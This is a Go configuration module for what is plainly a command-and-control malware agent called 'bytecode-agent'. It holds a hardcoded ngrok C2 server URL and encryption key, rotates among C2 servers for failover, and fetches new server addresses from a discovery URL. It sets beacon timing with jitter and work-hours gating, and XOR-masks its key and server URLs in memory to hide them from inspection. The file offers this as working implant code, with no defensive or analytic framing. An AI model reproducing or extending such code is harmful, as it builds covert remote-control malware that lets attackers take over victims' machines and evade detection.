package config

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
	"time"

	"bytecode-agent/internal/windows"
)

// DefaultServerURL can be overridden at build time
var DefaultServerURL = "https://thu-nonspurious-deloris.ngrok-free.dev"

// DebugMode can be set to "true" at build time
var DebugMode = "false"

// Config holds the agent configuration
type Config struct {
	ServerURLs    []string // List of C2 servers for rotation/failover
	CurrentURLIdx int      // Current server index
	DiscoveryURL  string
	BeaconMin     int
	BeaconMax     int
	IdentityFile  string
	IsDebug       bool
	EncryptionKey []byte
	Jitter        int
	WorkHours     WorkHours
}

type WorkHours struct {
	Enabled bool
	Start   int
	End     int
}

var DefaultBeaconMin = "30"
var DefaultBeaconMax = "60"
var DefaultEncryptionKey = "bytecode-c2-project-secret-key!!"
var DefaultDiscoveryURL = ""
var DefaultWorkHoursEnabled = "false"
var DefaultWorkHoursStart = "9"
var DefaultWorkHoursEnd = "17"

// Load returns the agent configuration
func Load() *Config {
	discoveryURL := os.Getenv("BYTECODE_DISCOVERY")
	serverEnv := os.Getenv("BYTECODE_SERVER")

	if serverEnv == "" {
		serverEnv = DefaultServerURL
	}

	// Support comma-separated list of servers
	urls := strings.Split(serverEnv, ",")
	for i := range urls {
		urls[i] = strings.TrimSpace(urls[i])
	}

	identityFile := os.Getenv("BYTECODE_IDENTITY")
	if identityFile == "" {
		identityFile = ".bytecode_id"
	}

	var min, max int
	fmt.Sscanf(DefaultBeaconMin, "%d", &min)
	fmt.Sscanf(DefaultBeaconMax, "%d", &max)

	var wStart, wEnd int
	fmt.Sscanf(DefaultWorkHoursStart, "%d", &wStart)
	fmt.Sscanf(DefaultWorkHoursEnd, "%d", &wEnd)

	if discoveryURL == "" {
		discoveryURL = DefaultDiscoveryURL
	}

	cfg := &Config{
		ServerURLs:    urls,
		CurrentURLIdx: 0,
		DiscoveryURL:  discoveryURL,
		BeaconMin:     min,
		BeaconMax:     max,
		IdentityFile:  identityFile,
		IsDebug:       DebugMode == "true",
		EncryptionKey: []byte(DefaultEncryptionKey),
		Jitter:        25,
		WorkHours: WorkHours{
			Enabled: DefaultWorkHoursEnabled == "true",
			Start:   wStart,
			End:     wEnd,
		},
	}

	if cfg.DiscoveryURL != "" {
		discovered, err := FetchDiscoveryURL(cfg.DiscoveryURL)
		if err == nil && discovered != "" {
			cfg.ServerURLs = append([]string{discovered}, cfg.ServerURLs...)
		}
	}

	return cfg
}

// GetServerURL returns the currently active server URL
func (c *Config) GetServerURL() string {
	if len(c.ServerURLs) == 0 {
		return ""
	}
	return c.ServerURLs[c.CurrentURLIdx]
}

// RotateServer moves to the next available C2 server
func (c *Config) RotateServer() {
	if len(c.ServerURLs) > 1 {
		c.CurrentURLIdx = (c.CurrentURLIdx + 1) % len(c.ServerURLs)
	}
}

// Mask protects sensitive config in memory
func (c *Config) Mask() {
	key := byte(0x42)
	windows.MaskMemory(c.EncryptionKey, key)
	
	for i := range c.ServerURLs {
		b := []byte(c.ServerURLs[i])
		windows.MaskMemory(b, key)
		c.ServerURLs[i] = string(b)
	}
}

// Unmask restores config for use
func (c *Config) Unmask() {
	key := byte(0x42)
	windows.MaskMemory(c.EncryptionKey, key)
	
	for i := range c.ServerURLs {
		b := []byte(c.ServerURLs[i])
		windows.MaskMemory(b, key)
		c.ServerURLs[i] = string(b)
	}
}

func FetchDiscoveryURL(url string) (string, error) {
	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Get(url)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("discovery server returned %d", resp.StatusCode)
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	discovered := strings.TrimSpace(string(body))
	if !strings.HasPrefix(discovered, "http") {
		return "", fmt.Errorf("invalid URL discovered: %s", discovered)
	}

	return discovered, nil
}
